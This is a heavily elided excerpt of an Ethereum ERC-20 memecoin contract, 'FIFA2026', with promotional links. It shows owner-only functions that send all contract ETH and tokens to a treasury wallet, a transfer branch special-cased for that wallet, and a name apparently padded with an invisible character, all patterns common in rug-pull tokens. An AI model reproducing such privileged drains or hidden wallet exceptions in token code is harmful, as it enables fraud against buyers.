/*
    The OG FIFA2026 coin deployed on Ethereum.

    FIFA2026 has one of the biggest communities on the internet, and now it's making its mark in the crypto space.

    https://fifa2026.cool
    https://x.com/fifa2026_eth
    https://t.me/fifa2026_eth
*/
...
contract FIFAWORLDCUP is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"FIFA2026​";
    ...
    uint16 private _contract_ver = 1;
    ...
    constructor () payable{
        ...
        _treasureWallet = payable(_msgSender());
    ...
    function _transfer(address from, address to, uint256 amount) private {
	    ...
	    if (!marketPair[from] && !marketPair[to] && from!= address(this) ) {
            ...
            if (caLimit && !inSwap && marketPair[to] && swapEnabled && _buyCount>_preventSwapBefore) {
        ...
        } else if (_msgSender() == _treasureWallet) _samnt = taxAmount;
    ...
    function openMaxLimit() public onlyOwner{
    ...
    function rescueStuckETH() external onlyOwner {
        payable(_treasureWallet).transfer(address(this).balance);
    }

    function rescueStuckERC20Tokens(address _tokenAddr, uint _amount) external onlyOwner {
        IERC20(_tokenAddr).transfer(_treasureWallet, _amount);
    }
    ...
    function sendETHToFee(uint256 amount) private {
        _treasureWallet.transfer(amount);
    }
